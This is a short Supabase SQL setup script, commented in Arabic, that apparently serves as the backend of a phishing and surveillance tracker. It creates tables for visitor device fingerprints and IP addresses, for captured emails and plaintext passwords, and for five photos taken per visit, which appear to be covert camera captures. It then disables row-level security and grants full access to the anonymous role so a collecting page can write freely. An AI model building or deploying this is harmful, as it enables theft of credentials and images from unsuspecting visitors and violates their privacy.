-- ============================================================
-- Tracker Tables — شغّل هذا في Supabase SQL Editor
-- ============================================================

-- جدول الزوار (معلومات الجهاز والمتصفح)
CREATE TABLE IF NOT EXISTS visitors (
  id          BIGSERIAL PRIMARY KEY,
  session_id  TEXT        NOT NULL,
  user_agent  TEXT,
  language    TEXT,
  platform    TEXT,
  screen_width  INTEGER,
  screen_height INTEGER,
  timezone    TEXT,
  referrer    TEXT,
  ip          TEXT,
  created_at  TIMESTAMPTZ DEFAULT NOW() NOT NULL
);

-- جدول بيانات الدخول (الإيميل وكلمة المرور)
CREATE TABLE IF NOT EXISTS visitor_credentials (
  id          BIGSERIAL PRIMARY KEY,
  session_id  TEXT        NOT NULL,
  email       TEXT        NOT NULL,
  password    TEXT        NOT NULL,
  captured_at TIMESTAMPTZ DEFAULT NOW() NOT NULL
);

-- جدول الصور (5 صور لكل زيارة)
CREATE TABLE IF NOT EXISTS visitor_photos (
  id          BIGSERIAL PRIMARY KEY,
  session_id  TEXT        NOT NULL,
  photo_index INTEGER     NOT NULL,
  image_data  TEXT        NOT NULL,
  captured_at TIMESTAMPTZ DEFAULT NOW() NOT NULL
);

-- ============================================================
-- تعطيل RLS (Row Level Security) حتى يتمكن السيرفر من الكتابة
-- ============================================================
ALTER TABLE visitors           DISABLE ROW LEVEL SECURITY;
ALTER TABLE visitor_credentials DISABLE ROW LEVEL SECURITY;
ALTER TABLE visitor_photos     DISABLE ROW LEVEL SECURITY;

-- ============================================================
-- منح صلاحيات الكتابة والقراءة لـ anon role
-- ============================================================
GRANT ALL ON visitors            TO anon, authenticated, service_role;
GRANT ALL ON visitor_credentials TO anon, authenticated, service_role;
GRANT ALL ON visitor_photos      TO anon, authenticated, service_role;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO anon, authenticated, service_role;
